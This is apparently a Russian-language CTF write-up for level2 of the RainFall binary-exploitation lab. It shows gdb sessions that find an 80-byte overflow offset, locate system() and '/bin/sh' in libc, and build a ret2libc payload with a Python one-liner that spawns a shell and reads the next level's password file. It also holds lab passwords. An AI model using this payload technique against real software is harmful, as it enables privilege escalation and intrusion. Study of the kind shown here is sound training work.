@@ -1,0 +1,51 @@
+1. Логинимся level2:53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+2. Инвестигируем
+
+Так же как и в предыдущем найдём offset -> 80
+
+(gdb) r
+Starting program: /home/user/level2/level2
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+Program received signal SIGSEGV, Segmentation fault.
+0x37634136 in ?? ()
+и воспользуемся этим сайтом https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+
+
+
+system -> 0xb7e6b060
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+
+
+/bin/sh -> 0xb7f8cc58
+
+(gdb) info proc map
+process 3336
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         ...
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        ...
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+
+Готовим payload
+system -> 0xb7e6b060
+/bin/sh -> 0xb7f8cc58
+
+offset + system call + padding + string call
+level2@RainFall:~$ python -c "print 'x'*80 + '\x3e\x85\x04\x08' + '\x60\xb0\xe6\xb7'+ '0000'+'\x58\xcc\xf8\xb7'" > /tmp/level1
+level2@RainFall:~$ cat /tmp/level1 /dev/stdin | ./level2
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx>xxxxxxxxxxxx>`▒▒0000X▒▒▒
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+
+
